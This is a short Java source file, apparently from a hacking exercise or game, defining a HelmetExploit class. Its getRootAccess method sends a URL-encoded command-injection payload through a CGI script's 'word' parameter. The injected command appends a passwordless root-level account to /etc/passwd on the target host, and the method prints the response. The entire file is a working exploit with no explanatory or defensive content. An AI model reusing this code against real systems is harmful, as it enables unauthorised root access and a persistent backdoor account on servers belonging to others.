
import java.net.URL;
import java.net.URLConnection;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class HelmetExploit extends Exploit{
	
	
	public HelmetExploit(String user, String filepath, String IP){
		super(user, filepath, IP);
	}
	
	protected boolean getRootAccess(){
		
		String cmd = "%3Becho+" + dusr + "%3A%3A0%3A0%3A%3A%2F%3A%2Fbin%2Fsh+%3E%3E+%2Fetc%2Fpasswd%3B";
		
		try{
			URL url = new URL("http://" + ip + "/cgi-bin/hamlet?text=quarto&word=" + cmd);
			URLConnection conn = url.openConnection();
	        BufferedReader in = new BufferedReader(
                    new InputStreamReader(
                    conn.getInputStream()));
			String inputLine;
			
			while ((inputLine = in.readLine()) != null) 
			System.out.println(inputLine);
			in.close();

		}catch(Exception e){
			return false;
		}
		
		return true;
	}
}
